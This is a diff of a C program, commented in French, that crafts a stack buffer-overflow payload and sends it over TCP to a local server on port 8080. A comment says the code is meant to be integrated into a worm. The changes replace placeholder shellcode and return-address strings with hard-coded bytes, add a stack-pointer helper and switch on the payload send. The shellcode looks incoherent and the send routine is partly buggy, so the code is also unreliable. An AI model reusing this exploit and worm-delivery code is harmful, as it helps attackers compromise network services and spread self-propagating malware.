@@ -5,10 +5,18 @@
 #include <sys/socket.h>
 #include <unistd.h> 
 #define MAX 80
+#define PORT 8080
+#define SA struct sockaddr
 
 // Voir fonction strcat pour concaténer des chars (string.h)
 
 size_t pay_size;
+
+
+unsigned long get_sp(void) {
+__asm__("movq %rsp,%rax");
+}
+
 
 const char* crafted_payload(){
 
@@ -22,7 +30,8 @@ const char* crafted_payload(){
 	//printf("%s\n", nops);
 
 	// Shellcode en dur
-	char shellcode[] = "\x48\x45\x4c\x4c\x43\x4f\x44\x45";
+	char shellcode[] = "\xf3\x48\x48\x48\x74\xff\x48\xc3\xff\xf2\x0f\xf3\x68\xf2\x90\xf3\xf2\x0f\xf3\xf2\x0f\xf3\x31\x49\x5e\x48\x48\x50\x54\x45\x31\x48\xff\xf4\x66\x00\x48\x48\x48\x74\x48\x48\x74\xff\x0f\xc3\x0f\x48\x48\x48\x48\x48\x48\x48\x48\x74\x48\x48\x74\xff\x66\xc3\x0f\xf3\x80\x75\x55\x48\x00\x48\x74\x48\xe8\xe8\xc6\x5d\xc3\x0f\xc3\x0f\xf3\xe9\xf3\x55\x48\x48\x48\xe8\xb8\x5d\xc3\xf3\x48\x48\xc3";
+	//char shellcode[] = "\x48\x45\x4c\x4c\x43\x4f\x44\x45";
 	//printf("%s\n", shellcode);
 
 	// Padding de bp
@@ -30,7 +39,8 @@ const char* crafted_payload(){
 	//printf("%s\n", padding_bp);
 
 	// Adresse de retour en dur
-	char retour[] = "\x41\x44\x44\x52\x5f\x52\x45\x54";
+	char retour[] = "\x01\x40\x73\x74\x88\x34\x60\xb2";
+	//char retour[] = "\x41\x44\x44\x52\x5f\x52\x45\x54";
 	//printf("%s\n", retour);
 
 	char final_buf[sizeof(nops) + sizeof(shellcode) + sizeof(padding_bp) + sizeof(retour)];
@@ -42,7 +52,7 @@ const char* crafted_payload(){
 	//printf("%s\n", final_buf);
 
 	pay_size = sizeof(final_buf);
-	//printf("%zu\n", pay_size);
+	printf("%zu\n", pay_size);
 
 	char * pay = malloc(pay_size * sizeof(char));
 	//printf("%zu\n", sizeof(pay));
@@ -52,9 +62,10 @@ const char* crafted_payload(){
 	return pay;
 }
 
-int func(int sockfd, char *pay)
+
+int func(int sockfd, const char *pay)
 {
-	printf("Overflow en cours...");
+	printf("Overflow en cours...\n");
 	int verif = write(sockfd, pay, sizeof(pay));
 	if (verif == -1){
 		printf("Error : Payload sending failed\n");
@@ -65,17 +76,40 @@ int func(int sockfd, char *pay)
 	return verif;
 }
 
-/*unsigned long get_sp(void) {
-__asm__("movq %rsp,%rax");
-}
-long l=get_sp();
-printf("Ox%lu\n", l);
-*/
+
 
 
 int main (int argc, char *argv[]){
 
-	int sockfd = 1; // A CHANGER ET METTRE L'ARG DE LA FCT A LA PLACE 
+	int sockfd, connfd;
+	struct sockaddr_in servaddr, cli;
+
+	// socket create and verification
+	sockfd = socket(AF_INET, SOCK_STREAM, 0);
+	if (sockfd == -1) {
+		printf("socket creation failed...\n");
+		exit(0);
+	}
+	else
+		printf("Socket successfully created..\n");
+	bzero(&servaddr, sizeof(servaddr));
+
+	// assign IP, PORT
+	servaddr.sin_family = AF_INET;
+	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
+	servaddr.sin_port = htons(PORT);
+
+	// connect the client socket to server socket
+	if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr))
+		!= 0) {
+		printf("connection with the server failed...\n");
+		exit(0);
+	}
+	else
+		printf("connected to the server..\n");
+
+
+	//int sockfd = 1; // A CHANGER ET METTRE L'ARG DE LA FCT A LA PLACE 
 
 	//printf("%li\n", pay_size);
 	/*char payload[pay_size];
@@ -100,7 +134,9 @@ int main (int argc, char *argv[]){
     // COMMENT @retour = @base pile + taille instruction ENTIERE
 
     // Envoi de la payload
-	//int over_flow = func(sockfd, payload);  // A DECOMMENTER UNE FOIS INTEGREE DANS LE VERS
+	//long l=get_sp();
+	//printf("Ox%lu\n", l);
+	int over_flow = func(sockfd, payload);  // A DECOMMENTER UNE FOIS INTEGREE DANS LE VERS
 
     printf("%s\n", payload);
 	printf("OK\n");
